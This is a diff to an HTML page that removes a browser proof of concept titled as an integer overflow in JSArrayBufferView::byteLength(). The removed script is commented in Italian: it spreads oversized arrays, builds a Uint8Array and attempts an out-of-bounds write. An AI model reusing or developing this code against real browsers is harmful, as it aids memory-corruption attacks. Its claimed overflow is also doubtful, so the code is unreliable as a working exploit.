@@ -5,30 +5,7 @@
    
 </head>
 <body>
-    <h1>PoC Integer Overflow in JSArrayBufferView::byteLength()</h1>
-    <script>
-        try {
-            // 1. Creiamo un array molto grande:
-            const big = new Array(0x7fffffff);
-            alert(`Passo 1: creato array "big" con length = ${big.length}`);
-
-            // 2. Duplichiamo via spread per far overflow della length:
-            const overflowed = [0, ...big, ...big];
-            alert(`Passo 2: array "overflowed" creato, length interna = ${overflowed.length}`);
-
-            // 3. Creiamo il TypedArray senza overflow check:
-            const ta = new Uint8Array(overflowed);
-            alert(`Passo 3: nuovo Uint8Array creato, ta.length = ${ta.length}`);
-
-            // 4. Scrittura fuori dai limiti reali del buffer:
-            const oobIndex = overflowed.length;
-            ta[oobIndex] = 0x41;
-            alert(`Passo 4: tentata scrittura OOB all’indice ${oobIndex}`);
-
-            alert('PoC completato senza eccezioni.');
-        } catch (e) {
-            alert(`Errore rilevato: ${e.name}: ${e.message}`);
-        }
+    
     </script>
 </body>
 </html>
